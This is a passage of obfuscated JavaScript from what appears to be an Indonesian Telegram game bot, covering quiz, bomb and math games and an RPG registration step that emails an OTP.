_0x1da79c[_0x240d04(0x2eef)]=[_0x1ce978['oHyYw'],_0x1ce978[_0x240d04(0xb0e)],_0x240d04(0x12f5)+_0x240d04(0x2413)+_0x240d04(0x100b),_0x240d04(0x12f5)+'\x20:\x2022%\x0a\x0aHa'+_0x240d04(0x269f),_0x1ce978[_0x240d04(0x1ef0)],_0x1ce978[_0x240d04(0x51b)],_0x1ce978[_0x240d04(0x1fb3)],_0x1ce978['HMSNV'],_0x1ce978['GFVzo'],_0x1ce978[_0x240d04(0x79c)],_0x1ce978['Gmlug'],_0x1ce978[_0x240d04(0xda4)],_0x240d04(0x12f5)+'\x20:\x2077%\x0a\x0aGa'+_0x240d04(0x15b5)+_0x240d04(0x10ab)+_0x240d04(0xf7f)+'lu',_0x1ce978[_0x240d04(0x70e)],_0x1ce978['RkyHS'],_0x1ce978[_0x240d04(0x1124)],_0x1ce978['OtBrW'],_0x1ce978[_0x240d04(0x2e1a)],'Wibu\x20Level'+_0x240d04(0x2c83)+_0x240d04(0x874)+_0x240d04(0x2bec)+'INI\x20CUY!!!','Wibu\x20Level'+_0x240d04(0x2c83)+_0x240d04(0x874)+_0x240d04(0x2bec)+_0x240d04(0x454)],_0x2555e7(_0x1ce978[_0x240d04(0x18d9)](_0x29e984,_0x2186fc[_0x240d04(0x2eef)]));}catch(_0x50d7fc){console[_0x240d04(0x15e)](_0x50d7fc),_0x1ce978[_0x240d04(0xed7)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]);}}break;case _0x1ce978[_0x240d04(0xd41)]:{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0x1311)](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]);try{if(_0x1ce978[_0x240d04(0x21ee)](_0x1ce978['ViuDc'],_0x1ce978['phbCN'])){const _0x5a449f=await _0x182219(),_0x2c1e99=_0x5a449f[_0xb65b97]=_0x5a449f[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x2c1e99||!_0x2c1e99['nama']||!_0x2c1e99[_0x240d04(0x634)])return _0x1ce978['dqteO']===_0x1ce978['aTqnR']?_0x3af9b1[_0x240d04(0x55c)](_0x7bd933):_0x1ce978[_0x240d04(0x2729)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x2c1e99[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x13df)]===_0x1ce978[_0x240d04(0x23d4)]?_0x1ce978['xXRrR'](_0x4af592,_0x240d04(0x2b2b)+'\x20misi\x20*'+_0x30a44c[_0x240d04(0xbe8)][_0x217907][0x0]+'*\x20dulu.'):_0x1ce978[_0x240d04(0x7b7)](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]);const _0x3162b3=await fetch(_0x1ce978['pClQk'])['then'](_0x6e5834=>_0x6e5834['json']()),_0x35ed59=_0x3162b3[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x85a)](Math[_0x240d04(0x24f1)](),_0x3162b3[_0x240d04(0x2b45)]))],_0x1f833=_0x35ed59[_0x240d04(0x13cb)][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x1f833,'startedAt':Date['now'](),'type':_0x1ce978[_0x240d04(0xd41)],'hintUsed':![]},_0x1ce978[_0x240d04(0x1017)](_0x476bfb,'soal:*'+_0x35ed59[_0x240d04(0x1d4)]+('*\x0a\x0aGunakan'+_0x240d04(0x28b6)+_0x240d04(0x1b69)+_0x240d04(0x296)+_0x240d04(0x115e)+_0x240d04(0x2ba6)+'.\x0aKamu\x20pun'+_0x240d04(0xe33)+'k!'),{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),setTimeout(()=>{const _0x10ebfa=_0x240d04;activeGame[_0xb65b97]&&_0x1ce978[_0x10ebfa(0x163a)](Date[_0x10ebfa(0x104e)]()-activeGame[_0xb65b97][_0x10ebfa(0x1e3f)],0xea60)&&(_0x1ce978[_0x10ebfa(0x6d8)](_0x476bfb,_0x10ebfa(0xb17)+_0x10ebfa(0x2a04)+_0x10ebfa(0x26d4)+_0x1ce978[_0x10ebfa(0x13a4)](_0x2ca95e,_0x1f833)+'*'),delete activeGame[_0xb65b97]);},0xea60);}else return _0x1ce978[_0x240d04(0x6fc)](_0x47e489,'⚠️\x20Kamu\x20bel'+_0x240d04(0x23c6)+_0x240d04(0x1813)+'an\x20/daftar'+_0x240d04(0x2cfd)+_0x240d04(0x163d)+_0x240d04(0x2d8a));}catch(_0x1a7eef){if(_0x1ce978[_0x240d04(0x1638)]===_0x1ce978['RHgtx'])console[_0x240d04(0x15e)](_0x1a7eef),_0x1ce978[_0x240d04(0x1081)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]);else return _0x2b33f2=_0x1ce978[_0x240d04(0x121c)](_0x2f44d5,_0x5a6a7),_0x1ce978[_0x240d04(0x1e7b)](typeof _0x3cae45,_0x1ce978[_0x240d04(0xf5e)])&&!_0x1ce978[_0x240d04(0x1f8b)](_0x3f04cd,_0x23df58);}}break;case _0x1ce978[_0x240d04(0x1af5)]:{if(_0x1ce978[_0x240d04(0x1ebd)](_0x1ce978[_0x240d04(0x468)],_0x1ce978[_0x240d04(0x468)]))_0x1ce978[_0x240d04(0x2b72)](_0x3c55d4,_0x245b8f);else{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0x209c)](_0x1ce978['qAiGT'],_0x1ce978[_0x240d04(0x515)])?_0x11a6e5(_0x1ce978[_0x240d04(0x2d3a)]):_0x1ce978['PMzBW'](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]);try{const _0x57f5d8=await _0x1ce978[_0x240d04(0x285d)](_0x182219),_0x51573b=_0x57f5d8[_0xb65b97]=_0x57f5d8[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x51573b||!_0x51573b[_0x240d04(0x2eea)]||!_0x51573b[_0x240d04(0x634)]){if(_0x1ce978[_0x240d04(0xe83)]!==_0x240d04(0x229f))return _0x476bfb(_0x240d04(0x19fe)+'um\x20daftar\x20'+_0x240d04(0x1813)+_0x240d04(0x33b)+'\x20nama.umur'+'\x20untuk\x20mul'+_0x240d04(0x2d8a));else _0x1ce978[_0x240d04(0x142)](_0x4ca859,_0x4896f8,_0x23439c[_0x240d04(0x2b45)],_0x1ce978['eoeNH']);}if(_0x51573b[_0x240d04(0x2344)])return _0x1ce978['avqRg'](_0x476bfb,_0x1ce978['sQGDl']);const _0x190e00=await _0x1ce978[_0x240d04(0x982)](fetch,_0x1ce978[_0x240d04(0xe55)])[_0x240d04(0xefe)](_0x108999=>_0x108999[_0x240d04(0x1314)]()),_0x327709=_0x190e00[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1ed4)](Math[_0x240d04(0x24f1)](),_0x190e00[_0x240d04(0x2b45)]))],_0x1f5054=_0x327709[_0x240d04(0x13cb)][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x1f5054,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978['SPVji'],'hintUsed':![]},await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x327709['img']},{'caption':_0x1ce978[_0x240d04(0x1f25)],'parse_mode':_0x240d04(0x21a9)}),setTimeout(()=>{const _0x45db5b=_0x240d04;activeGame[_0xb65b97]&&Date[_0x45db5b(0x104e)]()-activeGame[_0xb65b97][_0x45db5b(0x1e3f)]>=0xea60&&(_0x1ce978[_0x45db5b(0x217c)](_0x476bfb,_0x45db5b(0xb17)+_0x45db5b(0x2a04)+_0x45db5b(0x26d4)+_0x1ce978['RWFOm'](_0x2ca95e,_0x1f5054)+'*'),delete activeGame[_0xb65b97]);},0xea60);}catch(_0x3be3f5){if(_0x1ce978['RYQOD'](_0x240d04(0x222),_0x1ce978[_0x240d04(0x1d36)]))console[_0x240d04(0x15e)](_0x3be3f5),_0x1ce978['iXNgE'](_0x476bfb,_0x240d04(0x2720)+_0x240d04(0x1934)+'.');else return _0x1ce978['ZiWTN'](_0x2b4d7d,_0x1ce978[_0x240d04(0x1453)]);}}}break;case _0x240d04(0xd96):{const _0x10db11=_0x57edc3[_0xb65b97];if(!_0x10db11||!_0x10db11[_0x240d04(0x2eea)]||!_0x10db11[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x2064)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(activeGame[_0xb65b97])return _0x476bfb(_0x240d04(0x10a8)+_0x240d04(0x29d0)+_0x240d04(0x29c2)+'nakan\x20/sur'+_0x240d04(0x3e9)+_0x240d04(0xbd1));try{const _0x2a60c4=await _0x1ce978[_0x240d04(0x2347)](fetch,_0x1ce978[_0x240d04(0x14ec)]),_0x268c5e=await _0x2a60c4[_0x240d04(0x1314)]();if(!Array[_0x240d04(0x1a7e)](_0x268c5e)||_0x1ce978[_0x240d04(0xb09)](_0x268c5e['length'],0x0))return _0x1ce978[_0x240d04(0x2cf1)](_0x476bfb,_0x240d04(0x1b0a)+_0x240d04(0x2d70));const _0x550766=_0x268c5e[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1f51)](Math[_0x240d04(0x24f1)](),_0x268c5e[_0x240d04(0x2b45)]))];activeGame[_0xb65b97]={'type':'family100','soal':_0x550766['soal'],'jawaban':_0x550766[_0x240d04(0x13cb)][_0x240d04(0x16e6)](_0x32937d=>_0x32937d['toLowerCas'+'e']()),'terjawab':[],'startedAt':Date[_0x240d04(0x104e)]()},_0x1ce978['pbczU'](_0x476bfb,_0x240d04(0xae2)+_0x240d04(0x243d)+_0x550766[_0x240d04(0x2461)][_0x240d04(0xdd3)+'e']()+(_0x240d04(0x1cc8)+'banyak\x20mun'+'gkin\x20dalam'+_0x240d04(0x15a0)+'!\x0aGunakan\x20'+_0x240d04(0x163b)+_0x240d04(0x2ceb)+'h.')),_0x1ce978['zCnsG'](setTimeout,()=>{const _0x5a3271=_0x240d04;if(_0x1ce978[_0x5a3271(0x160c)](_0x1ce978['xmEve'],_0x1ce978[_0x5a3271(0x149f)]))activeGame[_0xb65b97]&&(_0x1ce978[_0x5a3271(0x108a)](_0x476bfb,_0x5a3271(0xb17)+_0x5a3271(0x8a7)+'an\x20lengkap'+_0x5a3271(0x1f59)+activeGame[_0xb65b97][_0x5a3271(0x13cb)][_0x5a3271(0x86e)](_0x1ce978['apsgR'])),delete activeGame[_0xb65b97]);else return _0x3fa310(_0x1ce978[_0x5a3271(0x98b)]);},0x1d4c0);}catch(_0x3ea231){console['error'](_0x3ea231),_0x1ce978[_0x240d04(0x28d1)](_0x476bfb,_0x240d04(0x2952)+_0x240d04(0x72c)+_0x240d04(0x1c26));}}break;case _0x1ce978['bLxVP']:{if(!activeGame[_0xb65b97])return _0x476bfb(_0x240d04(0x9a0)+'\x20sedang\x20be'+_0x240d04(0x2ce));if(activeGame[_0xb65b97][_0x240d04(0x6d5)])return _0x1ce978[_0x240d04(0xfaa)](_0x476bfb,_0x1ce978[_0x240d04(0x28f9)]);activeGame[_0xb65b97][_0x240d04(0x6d5)]=!![],_0x1ce978[_0x240d04(0x1551)](_0x476bfb,_0x240d04(0x27e0)+activeGame[_0xb65b97][_0x240d04(0x1f5f)]+_0x240d04(0x22e6)+_0x1ce978[_0x240d04(0x2945)](_0x3c28d1,activeGame[_0xb65b97][_0x240d04(0x268f)])+'*',{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]});}break;case _0x1ce978[_0x240d04(0x1092)]:{if(bombGame[_0xb65b97]){clearTimeout(bombGame[_0xb65b97][_0x240d04(0x107b)]);const _0x3f4770=bombGame[_0xb65b97][_0x240d04(0x2dc1)][_0x240d04(0x3de)](_0x6115da=>_0x6115da[_0x240d04(0x1357)]==='💥'),_0x321577=await _0x182219(),_0x43ef37=_0x321577[_0xb65b97]=_0x321577[_0xb65b97]||{'exp':0x0,'money':0x0,'level':0x0};return _0x43ef37['exp']=Math[_0x240d04(0x1c2f)](0x0,_0x1ce978['oaDVk'](_0x43ef37[_0x240d04(0x21ac)],0x14)),await _0x1ce978[_0x240d04(0x48a)](_0x961430,_0x321577),delete bombGame[_0xb65b97],_0x1ce978[_0x240d04(0x182e)](_0x476bfb,_0x240d04(0x25d3)+'yerah!\x0aBom'+_0x240d04(0x1240)+_0x240d04(0x1be8)+_0x3f4770[_0x240d04(0x19b5)]+_0x240d04(0x47e));}if(mathGame[_0xb65b97]){if(_0x1ce978[_0x240d04(0x24e3)](_0x1ce978['cBCED'],_0x1ce978['fZBlx'])){_0x1ce978['MKFiV'](clearTimeout,mathGame[_0xb65b97]['timeout']);const _0x259e73=mathGame[_0xb65b97]['result'];return delete mathGame[_0xb65b97],_0x1ce978['kohFs'](_0x476bfb,'🏳️\x20Kamu\x20men'+_0x240d04(0x971)+_0x240d04(0x1b0f)+_0x240d04(0x96f)+_0x259e73+'*');}else _0x15f19d(_0x220925),delete _0x5af013['misi'][_0x4038b9];}if(!activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0xd6c)](_0x476bfb,_0x1ce978['pvrSX']);const _0x23ac0a=_0x1ce978[_0x240d04(0x603)](_0x2ca95e,activeGame[_0xb65b97][_0x240d04(0x268f)]);return delete activeGame[_0xb65b97],_0x476bfb('Game\x20dihen'+_0x240d04(0xa0e)+_0x240d04(0x1d90)+'alah:\x20*'+_0x23ac0a+'*');}break;case _0x240d04(0x20b3):{const _0x10605b=_0x57edc3[_0xb65b97];if(!_0x10605b||!_0x10605b[_0x240d04(0x2eea)]||!_0x10605b[_0x240d04(0x634)])return _0x1ce978['vNrPh'](_0x476bfb,_0x1ce978['KdBjs']);if(bombGame[_0xb65b97])return _0x1ce978[_0x240d04(0x2a2b)](_0x476bfb,'*⚠️\x20Kamu\x20ma'+'sih\x20dalam\x20'+_0x240d04(0x76a)+_0x240d04(0x2eb9)+_0x240d04(0x153)+_0x240d04(0x2ba6)+'.*');const _0x9250f9=['💥','✅','✅','✅','✅','✅','✅','✅','✅'][_0x240d04(0x2e77)](()=>Math[_0x240d04(0x24f1)]()-0.5),_0x3aa51c=[_0x1ce978['SiFsA'],_0x1ce978[_0x240d04(0x2870)],_0x1ce978[_0x240d04(0x24c1)],_0x240d04(0x1886),_0x240d04(0x2412),_0x1ce978[_0x240d04(0xc38)],_0x1ce978[_0x240d04(0x355)],_0x240d04(0x1208),_0x1ce978[_0x240d04(0x15f4)]],_0x42a166=_0x9250f9[_0x240d04(0x16e6)]((_0x1b409e,_0x2ae891)=>({'emot':_0x1b409e,'number':_0x3aa51c[_0x2ae891],'position':_0x2ae891+0x1,'state':![]}));let _0x4ababf=_0x240d04(0x1a3e)+_0x240d04(0xbdd)+_0x240d04(0x1519)+_0x240d04(0x190)+_0x240d04(0x2e38)+'otak:\x0a\x0a';for(let _0x4c566a=0x0;_0x1ce978[_0x240d04(0x1390)](_0x4c566a,_0x42a166[_0x240d04(0x2b45)]);_0x4c566a+=0x3){_0x4ababf+=_0x1ce978[_0x240d04(0x145a)](_0x42a166['slice'](_0x4c566a,_0x4c566a+0x3)['map'](_0x17992b=>_0x17992b[_0x240d04(0x19b5)])['join'](''),'\x0a');}_0x4ababf+=_0x240d04(0x47a)+'*3\x20menit*\x0a'+'Ketik\x20*sur'+'en*\x20untuk\x20'+'menyerah.',_0x1ce978[_0x240d04(0x1457)](_0x476bfb,_0x4ababf),bombGame[_0xb65b97]={'array':_0x42a166,'startedAt':Date[_0x240d04(0x104e)](),'timeout':_0x1ce978[_0x240d04(0x1391)](setTimeout,()=>{const _0x31a67d=_0x240d04,_0x38b381=_0x42a166[_0x31a67d(0x3de)](_0x512235=>_0x512235[_0x31a67d(0x1357)]==='💥');bombGame[_0xb65b97]&&(_0x1ce978[_0x31a67d(0x26d6)](_0x476bfb,'⏱️\x20*Waktu\x20h'+_0x31a67d(0x1c69)+_0x31a67d(0x1240)+_0x31a67d(0x1be8)+_0x38b381[_0x31a67d(0x19b5)]),delete bombGame[_0xb65b97]);},0x2bf20)};}break;case _0x1ce978[_0x240d04(0x21f2)]:{const _0x2f5b5a=_0x57edc3[_0xb65b97];if(!_0x2f5b5a||!_0x2f5b5a[_0x240d04(0x2eea)]||!_0x2f5b5a['umur']){if(_0x1ce978['IjVpK'](_0x1ce978[_0x240d04(0x2d4a)],_0x1ce978[_0x240d04(0x12da)]))return _0x476bfb(_0x240d04(0x19fe)+_0x240d04(0x23c6)+'RPG!\x0aGunak'+'an\x20/daftar'+_0x240d04(0x2cfd)+_0x240d04(0x163d)+_0x240d04(0x2d8a));else _0x30ae55=_0x46a908[_0x240d04(0x1c2f)](0x1,_0x3c3ebf(_0x260881[0x1]));}const _0x558670={'noob':[-0x3,0x3,-0x3,0x3,'+-',0x3a98,0xa],'easy':[-0xa,0xa,-0xa,0xa,_0x1ce978[_0x240d04(0x2a41)],0x4e20,0x28],'medium':[-0x28,0x28,-0x14,0x14,_0x1ce978['SOxnH'],0x9c40,0x96],'hard':[-0x64,0x64,-0x46,0x46,_0x240d04(0x1bd2),0xea60,0x15e],'extreme':[-0xf423f,0xf423f,-0xf423f,0xf423f,'*/',0x7530,0x270f],'impossible':[-0x174876e7ff,0x174876e7ff,-0x174876e7ff,0xe8d4a50fff,'*/',0x7530,0x88b8],'impossible2':[-0x38d7ea4c67fff,0x38d7ea4c67fff,-0x3e7,0x3e7,'/',0x7530,0xc350]},_0x6954f7={'+':'+','-':'-','*':'×','/':'÷'},_0x3004fd=_0x33cfb1[_0x240d04(0x2d6d)]()[_0x240d04(0x1c39)](/\s+/);if(!_0x3004fd[0x0])return _0x476bfb(_0x240d04(0x483)+_0x240d04(0x24f0)+Object[_0x240d04(0x1adb)](_0x558670)[_0x240d04(0x86e)](_0x1ce978[_0x240d04(0x1cfc)])+'\x0aContoh:\x20'+_0x1ec495+('math\x20mediu'+'m'));const _0xc1f02a=_0x3004fd[0x0]['toLowerCas'+'e']();if(!_0x1ce978[_0x240d04(0x11b0)](_0xc1f02a,_0x558670))return _0x1ce978[_0x240d04(0x390)](_0x476bfb,'Mode\x20tidak'+_0x240d04(0x1d59)+'nakan\x20sala'+_0x240d04(0x1de)+Object[_0x240d04(0x1adb)](_0x558670)['join'](_0x1ce978[_0x240d04(0x1cfc)]));if(mathGame[_0xb65b97])return _0x1ce978[_0x240d04(0x506)](_0x476bfb,_0x240d04(0x2ca0)+_0x240d04(0x2470)+'oal\x20yang\x20b'+'elum\x20dijaw'+_0x240d04(0x97c)+'n\x20/suren\x20u'+'ntuk\x20menye'+_0x240d04(0x13eb));const _0x1d19d8=_0x1ce978[_0x240d04(0x154f)](_0x4edfd7,_0xc1f02a,_0x558670,_0x6954f7);_0x1ce978[_0x240d04(0xed5)](_0x476bfb,_0x240d04(0x490)+_0x240d04(0x396)+_0xc1f02a['toUpperCas'+'e']()+(')*\x0a\x0aBerapa'+'\x20hasil\x20dar'+_0x240d04(0x13b2))+_0x1d19d8[_0x240d04(0x437)]+('*\x0a\x0aTimeout'+':\x20')+_0x1ce978[_0x240d04(0x2c6f)](_0x1d19d8[_0x240d04(0x2331)],0x3e8)+(_0x240d04(0x16f7)+_0x240d04(0x13fb))+_0x1d19d8['bonus']+(_0x240d04(0x934)+_0x240d04(0x1025))),mathGame[_0xb65b97]={..._0x1d19d8,'timeout':_0x1ce978[_0x240d04(0x1b88)](setTimeout,()=>{const _0x2ee7b3=_0x240d04;mathGame[_0xb65b97]&&(_0x476bfb(_0x2ee7b3(0xb17)+_0x2ee7b3(0x8a7)+_0x2ee7b3(0x173d)+_0x2ee7b3(0x550)+_0x1d19d8['result']+'*'),delete mathGame[_0xb65b97]);},_0x1d19d8['time'])};}break;case _0x1ce978['IMmlB']:{const _0x32a01d=await _0x1ce978[_0x240d04(0x2aef)](_0x182219);if(_0x32a01d[_0xb65b97]&&_0x32a01d[_0xb65b97][_0x240d04(0x2eea)])return _0x1ce978[_0x240d04(0x1de6)](_0x476bfb,_0x240d04(0x2a71)+_0x240d04(0x180e)+'ar.\x0aGunaka'+_0x240d04(0x1393)+_0x240d04(0x34c)+'menghapus\x20'+_0x240d04(0x24de));if(!_0x33cfb1['includes']('.')||!_0x33cfb1[_0x240d04(0x55c)]('|')){if(_0x1ce978['EzWey'](_0x1ce978[_0x240d04(0x2018)],_0x1ce978[_0x240d04(0x2018)]))_0x1ce978[_0x240d04(0x650)](_0x1de955,_0x1ce978[_0x240d04(0xf64)](_0x240d04(0x2720)+_0x240d04(0xd02),_0x1eec76['message']));else return _0x1ce978[_0x240d04(0x2678)](_0x476bfb,_0x1ce978[_0x240d04(0x2d3a)]);}const [_0x350018,_0x14b894]=_0x33cfb1[_0x240d04(0x1c39)]('|'),[_0x333691,_0x51c7fc]=_0x350018[_0x240d04(0x1c39)]('.'),_0x19d729=_0x1ce978[_0x240d04(0xd5a)](parseInt,_0x51c7fc);if(!_0x333691||_0x1ce978[_0x240d04(0x2ec6)](isNaN,_0x19d729))return _0x1ce978[_0x240d04(0xdd4)](_0x476bfb,_0x1ce978[_0x240d04(0xc88)]);if(_0x1ce978[_0x240d04(0x1b8f)](_0x19d729,0xc)||_0x19d729>0x1e)return _0x1ce978['mwzjv'](_0x476bfb,_0x1ce978[_0x240d04(0xa5c)]);const _0x14f4d2=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2a32)](0x186a0,_0x1ce978[_0x240d04(0x21fa)](Math[_0x240d04(0x24f1)](),0xdbba0)));try{const _0x29609d=await _0x1ce978['mopga'](fetch,_0x240d04(0x2364)+_0x240d04(0xf6c)+_0x240d04(0x7c5)+_0x240d04(0x2bdc)+_0x240d04(0x20c7)+_0x240d04(0x25a5)+_0x14b894+(_0x240d04(0x12d1)+_0x240d04(0x2667)+_0x240d04(0x2ecd)+_0x240d04(0x1554)+_0x240d04(0xcb3))+_0x14f4d2+_0x240d04(0x210a)+(_0x333691||_0x1ce978[_0x240d04(0x2a5e)])),_0x3ef210=await _0x29609d[_0x240d04(0x1314)]();global[_0x240d04(0x2670)+'r']=global[_0x240d04(0x2670)+'r']||{},global[_0x240d04(0x2670)+'r'][_0xb65b97]={'nama':_0x333691,'umur':_0x19d729,'email':_0x14b894,'otp':_0x14f4d2,'expired':_0x1ce978[_0x240d04(0x21ff)](Date[_0x240d04(0x104e)](),_0x1ce978['tlpkO'](_0x1ce978[_0x240d04(0x287a)](0x2,0x3c),0x3e8))},_0x1ce978[_0x240d04(0x516)](_0x476bfb,'✅\x20OTP\x20tela'+_0x240d04(0x7bd)+_0x240d04(0x1443)+_0x14b894+(_0x240d04(0x1bca)+'erifikasi\x20'+_0x240d04(0x2306)+_0x240d04(0x2d86)+'tkan.'));}catch(_0x23f281){if(_0x240d04(0x243f)!==_0x1ce978[_0x240d04(0x6c4)])console[_0x240d04(0x15e)](_0x23f281),_0x1ce978[_0x240d04(0x17b2)](_0x476bfb,_0x240d04(0x2720)+_0x240d04(0x134c)+_0x240d04(0xab7)+_0x240d04(0x1e33)+_0x240d04(0x19ff)+_0x240d04(0x1a6b)+'sudah\x20diat'+_0x240d04(0x5a9)+_0x240d04(0x2227));else return _0x1d086e[_0x240d04(0x15e)](_0xc26710),_0x1ce978[_0x240d04(0x9ca)](_0x2b8f69,_0x240d04(0x2720)+_0x240d04(0xc83)+'ta\x20RPG.');}}break;case _0x1ce978[_0x240d04(0xe3f)]:{const _0xc6d7e3=await _0x182219();if(_0xc6d7e3[_0xb65b97]&&_0xc6d7e3[_0xb65b97][_0x240d04(0x2eea)])return _0x1ce978[_0x240d04(0x2945)](_0x476bfb,'⚠️\x20Kamu\x20sud'+_0x240d04(0x180e)+_0x240d04(0x911)+_0x240d04(0x1393)+_0x240d04(0x34c)+_0x240d04(0x1377)+_0x240d04(0x24de));if(!_0x33cfb1||!/^\d{6}$/['test'](_0x33cfb1))return _0x476bfb(_0x1ce978['CCPxk']);const _0x4b2daa=global[_0x240d04(0x2670)+'r']?.[_0xb65b97];if(!_0x4b2daa)return _0x1ce978['RRHiQ'](_0x476bfb,_0x1ce978[_0x240d04(0xc5b)]);if(Date[_0x240d04(0x104e)]()>_0x4b2daa[_0x240d04(0x12b8)]){if(_0x1ce978[_0x240d04(0x1935)](_0x1ce978['sxoQh'],_0x1ce978['uWolt']))return delete global[_0x240d04(0x2670)+'r'][_0xb65b97],_0x476bfb(_0x1ce978[_0x240d04(0x28c7)]);else!_0x24f134[_0x240d04(0x55c)](_0x88c2c2)&&(_0x13a072[_0x240d04(0x7dc)](_0x24cb94),_0x1ce978[_0x240d04(0x285d)](_0x1e0085));}if(_0x1ce978[_0x240d04(0x4ef)](_0x33cfb1,_0x1ce978['QdbpR'](String,_0x4b2daa['otp'])))return _0x1ce978['SBYUG'](_0x476bfb,_0x1ce978[_0x240d04(0x1f8d)]);return _0xc6d7e3[_0xb65b97]={'nama':_0x4b2daa[_0x240d04(0x2eea)],'umur':_0x4b2daa[_0x240d04(0x634)],'email':_0x4b2daa[_0x240d04(0xf0)],'exp':0x0,'money':0x0,'level':0x0,'tiketcoin':0x0,'lastbonus':0x0,'tanggaldaftar':new Date()[_0x240d04(0x17bf)+_0x240d04(0x1743)](_0x240d04(0x18ea),{'dateStyle':_0x1ce978[_0x240d04(0x14f8)],'timeStyle':_0x1ce978[_0x240d04(0x11ae)]}),'lastkerja':0x0,'lastbansos':0x0,'ojekk':0x0,'lastmisi':0x0,'botol':0x0,'kaleng':0x0,'kardus':0x0,'gelas':0x0,'plastik':0x0,'lastmulung':0x0,'health':0x64,'pickaxe':0x0,'pickaxedurability':0x0,'lastmining':0x0,'trash':0x0,'string':0x0,'rock':0x0,'iron':0x0,'diamond':0x0,'emerald':0x0,'common':0x0,'uncommon':0x0,'mythic':0x0,'legendary':0x0,'gold':0x0,'potion':0x0,'atm':0x0,'bank':0x0,'fullatm':0x3b9aca00,'banteng':0x0,'harimau':0x0,'gajah':0x0,'kambing':0x0,'panda':0x0,'buaya':0x0,'kerbau':0x0,'sapi':0x0,'monyet':0x0,'babihutan':0x0,'babi':0x0,'ayam':0x0,'lastberkebon':0x0,'pisang':0x0,'anggur':0x0,'mangga':0x0,'jeruk':0x0,'apel':0x0,'bibitpisang':0x0,'bibitanggur':0x0,'bibitmangga':0x0,'bibitjeruk':0x0,'bibitapel':0x0,'warn':0x0,'jail':![],'armor':0x0,'armordurability':0x0,'lastclaim':0x0,'wood':0x0,'skill':'','rokets':0x0,'rob':0x0,'lastrob':0x0,'lastmonthly':0x0,'lastojek':0x0},await _0x1ce978[_0x240d04(0x2042)](_0x961430,_0xc6d7e3),delete global['otpRegiste'+'r'][_0xb65b97],_0x1ce978[_0x240d04(0x207b)](_0x476bfb,_0x240d04(0x1487)+_0x240d04(0x2754)+_0x240d04(0x3be)+'t\x20datang,\x20'+'*'+_0x4b2daa[_0x240d04(0x2eea)]+'*!');}break;case _0x240d04(0x18e):{const _0x513f85=await _0x1ce978['PDtkT'](_0x182219);if(!_0x513f85[_0xb65b97]||!_0x513f85[_0xb65b97][_0x240d04(0x2eea)])return _0x476bfb(_0x1ce978[_0x240d04(0x10c2)]);const _0x2121d3=_0x513f85[_0xb65b97][_0x240d04(0x2eea)];return delete _0x513f85[_0xb65b97],await _0x1ce978[_0x240d04(0x13a6)](_0x961430,_0x513f85),_0x1ce978[_0x240d04(0x23e9)](_0x476bfb,_0x240d04(0x1050)+_0x240d04(0x267f)+'\x20*'+_0x2121d3+('*\x20telah\x20di'+'hapus.'));}break;case _0x240d04(0x7b5):{if(_0x1ce978[_0x240d04(0x1a9b)]===_0x1ce978[_0x240d04(0x1a9b)]){if(!_0x3cd341)return _0x1ce978['tuoFU'](_0x476bfb,_0x1ce978[_0x240d04(0x1ce9)]);const [_0x2283a0,_0xf8bc53]=_0x33cfb1[_0x240d04(0x1c39)]('\x20'),_0x137e31=_0x1ce978[_0x240d04(0x10e5)](parseInt,_0xf8bc53);if(!_0x2283a0||_0x1ce978['CnstT'](isNaN,_0x137e31))return _0x476bfb(_0x1ce978[_0x240d04(0x9fd)]);const _0x3eadf7=await _0x1ce978[_0x240d04(0x24f6)](_0x182219),_0x555421=_0x3eadf7[_0xb65b97]=_0x3eadf7[_0xb65b97]||{'exp':0x0,'money':0x0,'level':0x0};if(_0x1ce978['TkHIs'](_0x2283a0,_0x1ce978[_0x240d04(0x14f5)]))return _0x555421[_0x240d04(0x21ac)]+=_0x137e31,await _0x961430(_0x3eadf7),_0x1ce978[_0x240d04(0x1745)](_0x476bfb,'✨\x20EXP\x20dita'+_0x240d04(0xe61)+_0x137e31+'\x0aTotal:\x20'+_0x555421[_0x240d04(0x21ac)]);if(_0x1ce978[_0x240d04(0x151b)](_0x2283a0,_0x1ce978[_0x240d04(0x5bb)]))return _0x1ce978[_0x240d04(0x2b9)]!==_0x1ce978[_0x240d04(0x2b9)]?_0x1ce978[_0x240d04(0x342)](_0x928d7d,_0x240d04(0xfcf)+'enunggu\x20*'+_0x1ce978[_0x240d04(0xd4a)](_0x1930b5,_0x52431e)+('*\x20sebelum\x20'+_0x240d04(0x113a)+_0x240d04(0x1dbb))):(_0x555421[_0x240d04(0xd24)]+=_0x137e31,await _0x1ce978[_0x240d04(0x1d7)](_0x961430,_0x3eadf7),_0x1ce978[_0x240d04(0x1603)](_0x476bfb,_0x240d04(0x2c58)+'tambah\x20+'+_0x137e31+(_0x240d04(0x2d53)+'\x20')+_0x555421['money'][_0x240d04(0x17bf)+'ring']()));return _0x1ce978[_0x240d04(0x14e1)](_0x476bfb,'❌\x20Tipe\x20han'+_0x240d04(0xf26)+_0x240d04(0x2bc9)+_0x240d04(0x1e2e));}else{if(typeof _0x4308be!==_0x240d04(0xc0e))return'';return _0x1ce978['hedrJ'](_0x1e0955[_0x240d04(0x211a)](0x0)[_0x240d04(0xdd3)+'e'](),_0x3d9489[_0x240d04(0x728)](0x1));}}break;case 